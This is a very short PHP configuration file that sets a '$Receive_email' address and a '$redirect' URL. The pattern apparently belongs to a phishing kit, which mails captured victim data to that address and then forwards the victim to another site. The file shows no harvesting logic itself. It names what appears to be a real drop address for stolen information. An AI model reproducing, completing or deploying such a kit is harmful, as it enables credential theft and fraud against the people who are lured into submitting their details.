<?php 
$Receive_email="ghostwork4live@gmail.com";
$redirect="https://sz1sz.com/judgeschoice/stujudgeschoice/";
?>